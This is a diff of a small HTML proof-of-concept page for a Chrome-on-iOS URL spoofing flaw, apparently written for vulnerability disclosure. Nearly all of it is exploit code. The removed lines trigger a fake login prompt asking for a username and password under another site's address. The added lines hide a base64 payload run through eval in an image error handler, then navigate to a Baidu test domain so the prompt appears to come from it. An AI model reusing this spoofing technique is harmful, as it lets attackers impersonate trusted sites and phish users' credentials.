@@ -1,14 +1,13 @@
 <html>
-  <body>
+    <head>
+        <title>Chrome URL spoofing vulnerability on IOS</title>
+    </head>
     <script>
-    function pwn() {
-        win = window.open('https://expired.badssl.com', '_self')
-        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
-    }
+        pwn = () => {
+            x = window.open("about:blank", "test");
+            x.document.write("<img src=@ onerror=eval(atob('c2V0VGltZW91dCgicHJvbXB0KCdmYWtlIGJhaWR1LmNvbSAsIERvbnQgZW50ZXIgcGFzc3dvcmQgeEQnKSIsMjAwMCk='))>");
+            setTimeout("x.location='https://test.baidu.com'", 1000);
+        }
     </script>
-
-    <iframe style="display:none" id="nop" src=""></iframe>
-
-    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
-  </body>
-</html>
+    <a onclick="pwn()"><h1>Clickme</h1></a>
+    </html>
